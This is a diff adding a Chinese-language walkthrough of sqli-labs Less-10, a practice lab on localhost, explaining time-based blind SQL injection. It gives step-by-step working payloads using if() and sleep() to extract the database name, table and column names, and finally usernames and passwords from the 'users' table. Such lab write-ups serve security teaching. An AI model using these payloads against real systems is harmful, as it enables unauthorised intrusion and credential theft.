@@ -1371,3 +1371,116 @@ http://localhost/sqli-labs/Less-2/
 
 
 ### Less-10
+
++ 正常打开页面
+
+![Less-10_1](./img/Less-10_1.PNG)
+
+第十关和第九关一样，不管注入什么页面显示的东西都一样，这时布尔盲注不适合，布尔盲注适合页面对错误和正确结果有不同反应。如果页面一直不变这时可用时间注入，时间注入和布尔盲注两种没有多大差别只不过时间盲注多了<code>if</code>函数和<code>sleep()</code>函数。
+
+
+
++ 第十关和第九关采用相同的注入方法，首先注入<code>if(a,sleep(10),1)</code>，如果a结果是真的那么执行<code>sleep(10)</code>页面延迟10秒，如果a的结果是假的执行1且页面不延迟。通过页面时间判断<code>id</code>参数是双引号字符串，这也是第十关唯一与第九关不同的地方
+
+~~~ shell
+判断参数构造
+?id=1" and if(1=1,sleep(10),1)--+
+~~~
+
+![Less-10_2](./img/Less-10_2.PNG)
+
+页面有延迟，说明注入可行
+
+
+
++ 注入如下语句判断数据库长度
+
+~~~ shell
+?id=1"and if(length((select database()))>5,sleep(5),1)--+
+判断数据库名长度
+~~~
+
+![Less-10_3](./img/Less-10_3.PNG)
+
+页面延迟加载说明数据库名长度大于5，改变参数逐一确定数据库名长度
+
+
+
++ 注入如下语句逐一判断数据库名
+
+~~~ shell
+?id=1" and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+
+~~~
+
+![Less-10_4](./img/Less-10_4.PNG)
+
+页面有延迟，说明数据库名的第一个字符的<code>ASCII</code>值是115，判断数据库名的其他字符可逐一改变参数去判断
+
+
+
++ 逐一判断联合数据表名长度
+
+~~~ shell
+?id=1"and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))>13,sleep(5),1)--+
+~~~
+
+![Less-10_5](./img/Less-10_5.PNG)
+
+页面有延迟，说明联合数据表名长度大于13，再逐渐改变参数准确判断联合数据表名长度
+
+
+
++ 逐一判断联合数据表名字符
+
+~~~ shell
+?id=1" and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))>99,sleep(5),1)--+
+~~~
+
+![Less-10_6](./img/Less-10_6.PNG)
+
+页面有延迟说明联合数据表名的第一个字符的<code>ASCII</code>值大于99，再逐渐改变参数确认联合数据表名的一个字符的<code>ASCII</code>值进而确定联合数据表名的第一个字符，然后再确定联合数据表名的其他字符
+
+
+
++ 判断联合字段名长度
+
+~~~ shell
+?id=1" and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))>10,sleep(5),1)--+
+~~~
+
+![Less-10_7](./img/Less-10_7.PNG)
+
+页面有延迟，说明联合字段名长度大于10，再逐渐改变参数确认联合字段名长度
+
+
+
++ 确定联合字段名字符
+
+~~~ shell
+?id=1" and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1))>99,sleep(5),1)--+
+~~~
+
+![Less-10_8](./img/Less-10_8.PNG)
+
+页面有延迟，说明联合字段名第一个字符的<code>ASCII</code>值大于99，改变参数确定后联合字段名第一个字符的<code>ASCII</code>值后即可确定联合字段名的第一个字符，再改变参数确定联合字段名的其他字符
+
+
+
++ 逐一检测内容
+
+~~~ shell
+?id=1" and if(ascii(substr((select group_concat(username,password) from users),1,1))>50,sleep(5),1)--+
+~~~
+
+![Less-10_9](./img/Less-10_9.PNG)
+
+页面有延迟，说明内容的第一个字符的<code>ASCII</code>值大于50，最终改变参数逐一确定内容的其他字符
+
+
+
++ 爆破完成，就是需要的步骤和内容很多
+
+
+
+### Less-11
+
